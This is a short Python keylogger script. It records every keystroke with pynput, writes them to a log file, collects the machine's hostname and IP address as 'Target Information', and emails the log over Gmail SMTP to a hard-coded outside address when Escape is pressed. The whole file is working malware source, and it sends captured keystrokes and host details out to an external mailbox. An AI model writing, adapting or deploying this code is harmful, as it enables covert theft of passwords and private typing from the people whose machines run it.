from types import BuiltinMethodType
import pynput 
from pynput.keyboard import Key,Listener
import smtplib
from email.message import EmailMessage
#msg=EmailMessage()

print("Script started Listening...")

import socket
count=0
keys=[]
file_indent=0

#...............................................................
#Email sending Function
def send_email():
    gmail_user = ''
    gmail_password = ''

    sent_from = gmail_user
    to = 'hacktolearn233@gmail.com'
    subject = 'Keylogger Log'
    
        

    try:
        server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
        server.ehlo()
        server.login(gmail_user, gmail_password)
        with open('log.txt') as myFile:
            body=myFile.read()
        server.sendmail(sent_from, to, body)
        server.close()

        print ('Email sent!')
    except:
        print ('Something went wrong...')
#.................................................................
h_name = socket.gethostname()
IP_address = socket.gethostbyname(h_name)

info = "Hostname is -> %s with IP address %s" % (h_name,IP_address)



def on_press(key):
    global keys,count
    keys.append(key)
    count=count+1
    print(key," pressed")
    if count>=10:
        
        write_file(keys)
        keys=[]

def write_file(keys):
    
    #date_and_time=datetime.now()
    #s="log [%s].txt" %date_and_time

    with open("log.txt","a") as f:
        
        for key in keys:
            k=str(key).replace("'","")
            if k.find("space")>0:
                f.write('\n')
            elif k.find("Key")==-1:
                f.write(k)

def on_release(key):
    if key==Key.esc:
        print("Uploading...")
        
        f1=open("log.txt","a")
        f1.write('\n')
        
        f1.write('...................................................................................')
        f1.write('\n')
        f1.write("Target Information")
        f1.write('\n')
        f1.write(info)
        send_email()
        return False


with Listener(on_press=on_press,on_release=on_release) as listener:
    listener.join()


